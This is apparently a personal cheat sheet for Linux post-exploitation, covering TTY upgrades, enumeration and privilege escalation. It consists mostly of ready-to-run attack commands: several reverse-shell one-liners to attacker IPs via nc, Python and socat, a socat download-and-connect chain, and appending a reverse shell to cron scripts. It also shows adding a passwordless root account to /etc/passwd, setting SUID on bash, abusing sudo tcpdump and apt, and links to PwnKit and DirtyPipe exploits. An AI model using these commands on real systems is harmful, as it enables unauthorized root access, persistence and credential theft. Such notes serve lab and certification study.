
Useful links:
[https://gtfobins.github.io/](https://gtfobins.github.io/)

Upgrading to full TTY

```
Upgrade TTY Linux

Once you have the upgrade, Ctrl+Z, stty raw -echo; fg; reset

check tty shell

tty

/dev/pts/0

localhost && nc 10.10.0.1 1234 -e /bin/bash

python -c 'import pty; pty.spawn("/bin/sh")'

python3 -c 'import pty; pty.spawn("/bin/sh")'

python3 -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(), *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

socat [file:`tty`,raw,echo=0](file://%60tty%60,raw,echo=0) tcp-listen:5555

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:5555

wget -q [https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat%20-O%20/tmp/socat); chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:4444

CTRL + Z

echo $TERM

Make a note of Kali term type

xterm-256color

Make a note of the number of rows and columns. Next, enter the following command which will allow us to pass keyboard shortcuts through.

stty -a

stty raw -echo

fg

reset

xterm

If you can't clear the screen or use the up arrow to view history at this point, use the following commands to set the terminal type and shell once more.

export TERM=xterm

export SHELL=bash

stty rows 27 columns 129
```

Basics

```
id

whoami

sudo -l

su root

sudo -i
```

Check users

```
cat /etc/passwd

cat /etc/sudoers
```

```
RUN THIS FIRST:

which python

python -c 'import pty; pty.spawn("/bin/bash")'

python3 -c 'import pty; pty.spawn("/bin/bash")'

Improve shell

CTRL+Z

stty raw -echo ; fg

Reset

Xterm

Enter

Linux version of above command

find . -type f -o -type d

OR sh

python -c 'import pty; pty.spawn("/bin/sh")'

python3 -c 'import pty; pty.spawn("/bin/sh")'

perl -e 'exec "/bin/sh";'

/bin/sh -i

echo && 'bash'

Basics

whoami

sudo -l

su - root

sudo -i

[https://gtfobins.github.io/](https://gtfobins.github.io/)

Pwnkit for /usr/bin/pkexec - SUID

[https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

pkexec "/bin/sh"

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2)

Check who can use Sudo (check permissions to config file if writable)

/etc/sudoers

TCP Dump for word pass - (requires root)

sudo tcpdump -i lo -A | grep "pass"

Baseline script - /usr/bin/unix-privesc-check

unix-privesc-check

./unix-privesc-check standard

./unix-privesc-check detailed > output.txt

you can use the id command to get a better idea of user context.

id

To enum users on linux, just cat /etc/passwd.  Try /etc/shadow too.  Probably won't work, but give it a go.

cat /etc/passwd

cat /etc/shadow

At some point you may need to rely on kernel exploits, and knowing the machine's OS is useful here:

uname -a

uname -r

cat /etc/issue

cat /etc/*-release

arch

Get a list of processes running on the system:

ps axu

watch -n 1 "ps -aux | grep pass"

Environment Variables

env

cat .bashrc

Check Scheduled Tasks:

grep "CRON" /var/log/syslog

cat /var/log/syslog | grep -i “CRON”

cat /etc/crontab

Modify cron scripts for reverse shell as root

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f" >> script.sh

List installed Programs:

dpkg -l

 "/var/", "/opt/", "/usr/local/src" and "/usr/src/" are good directories to dig through as well

 rpm -ql

Find folders you can write to:

find / -writable -type d 2>/dev/null

find / -type f -perm -04000 -ls 2>/dev/null

List Kernel modules:

lsmod

/sbin/modinfo [MODULENAME]

Check for SUID binaries:

find / -perm -u=s -type f 2>/dev/null

Make a binary with SET SUID

chmod u+s /bin/bash

Capabilities are extra attributes that can be applied to processes, binaries, and services to assign specific privileges (search for capabilities):

/usr/sbin/getcap -r / 2>/dev/null

^^^

The two perl binaries stand out as they have setuid capabilities enabled, along with the +ep flag specifying that these capabilities are effective and permitted. e.x. (( /usr/bin/gdb = cap_setuid+ep ))

Abusing passwd with SUID

passwd (leave it hanging)

ps u -C passwd

grep Uid /proc/1932/status

cat /proc/1131/status | grep Uid

ls -asl /usr/bin/passwd

find /home/joe/Desktop -exec "/usr/bin/bash" -p \;

whoami

root

Read weird binaries

strings /bin/binary

-LINUX PRIVESC TECHNIQUES-

Edit something you have permissions for that is being executed in crontab, and wait.

REVERSE SHELL ONE LINER

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f

Very important to check this permission

ls -la /etc/passwd

If you can write to /etc/passwd, you can set passwords.  If a hash is present in /etc/passwd, it takes precedence. (( 1. passwd >> 2. shadow ))

So start by creating a hash with openssl:

openssl passwd w00t

Then you can write your hash to a new superuser account like so:

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

Kernel exploits are a thing...

cat /etc/issue

uname -r

uname -a

arch

Compile shit C programs

gcc cve.c -o exploit_name

./cve-2017-16995

Consider searching for source code on weird web apps, see if you can find sections for usernames and passwords, then search on the machine.

rbash fucking you up?

-python -c 'import pty; pty.spawn("/bin/bash")'

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)

Add file to path:

export PATH="/usr/lib/gcc/i486-linux-gnu/4.6/:$PATH"

CONSIDER TRYING DIRTYPIPE

[https://raw.githubusercontent.com/febinrev/dirtypipez-exploit/main/dirtypipez.c](https://raw.githubusercontent.com/febinrev/dirtypipez-exploit/main/dirtypipez.c)

If you found tcpdump as sudo -l

COMMAND='id'

TF=$(mktemp)

echo "$COMMAND" > $TF

chmod +x $TF

sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root

Check logs for any errors

cat /var/log/syslog | grep tcpdump

(AppArmor is a kernel module that provides mandatory access control (MAC) on Linux systems by running various application-specific profiles, and it's enabled by default on Debian 10)

aa-status

apparmor module is loaded.

20 profiles are loaded.

18 profiles are in enforce mode.

   /usr/bin/evince

   /usr/bin/evince-previewer

   /usr/bin/evince-previewer//sanitized_helper

   /usr/bin/evince-thumbnailer

   /usr/bin/evince//sanitized_helper

   /usr/bin/man

   /usr/lib/cups/backend/cups-pdf

   /usr/sbin/cups-browsed

   /usr/sbin/cupsd

   /usr/sbin/cupsd//third_party

   /usr/sbin/tcpdump

If you found APT in sudo -l

sudo apt-get changelog apt

!/bin/sh

Enter

root

For linux kernal exploits

searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"

Move exploit through SSH with SCP from Kali

scp cve-2017-16995.c joe@IP:

scp test.txt userbravo@destination:/location2

scp -P PORT test.txt userbravo@destination:/location2

gcc cve-2017-16995.c -o cve-2017-16995

file cve-2017-16995

./cve-2017-16995

P.S. for GCC you can compile statically for making the executable library independent - in case you compile it on Kali and transfer to target

gcc -static

[https://opensource.com/article/22/6/static-linking-linux](https://opensource.com/article/22/6/static-linking-linux)

gcc -shared -fPIC -o libhax.so libhax.c
```